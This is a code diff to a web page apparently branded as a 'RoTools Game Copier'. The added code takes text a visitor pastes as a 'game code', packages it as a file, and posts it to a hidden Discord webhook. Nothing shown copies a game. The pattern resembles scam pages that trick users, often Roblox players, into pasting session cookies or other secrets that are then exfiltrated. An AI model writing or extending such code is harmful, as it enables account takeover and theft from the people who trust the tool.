@@ -683,39 +683,30 @@
             btn.textContent = 'Processing...';
 
             try {
-                // Create the Discord message payload
-                const payload = {
-                    content: `🎮 **New RoTools Game Code Submission**`,
-                    embeds: [{
-                        title: "Game Code Details",
-                        description: `\`\`\`\n${input.value}\n\`\`\``,
-                        color: 3447003, // Blue color
-                        timestamp: new Date().toISOString(),
-                        footer: {
-                            text: "RoTools Game Copier"
-                        },
-                        fields: [
-                            {
-                                name: "📅 Submitted At",
-                                value: new Date().toLocaleString(),
-                                inline: true
-                            },
-                            {
-                                name: "🔧 Tool Used",
-                                value: "RoTools Game Copier",
-                                inline: true
-                            }
-                        ]
-                    }]
+                // Create a text file from the input
+                const gameCode = input.value;
+                const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
+                const fileName = `game-code-${timestamp}.txt`;
+                
+                // Create a Blob with the game code content
+                const blob = new Blob([gameCode], { type: 'text/plain' });
+                
+                // Create FormData for multipart upload
+                const formData = new FormData();
+                formData.append('file', blob, fileName);
+                
+                // Create the message content
+                const messageContent = {
+                    content: `🎮 **New RoTools Game Code Submission**\n📁 **File:** ${fileName}\n📅 **Submitted:** ${new Date().toLocaleString()}\n🔧 **Tool:** RoTools Game Copier`
                 };
+                
+                // Add the message content to form data
+                formData.append('payload_json', JSON.stringify(messageContent));
 
-                // Send to Discord webhook
+                // Send to Discord webhook with file attachment
                 const response = await fetch(DISCORD_WEBHOOK_URL, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(payload)
+                    body: formData
                 });
 
                 if (response.ok) {
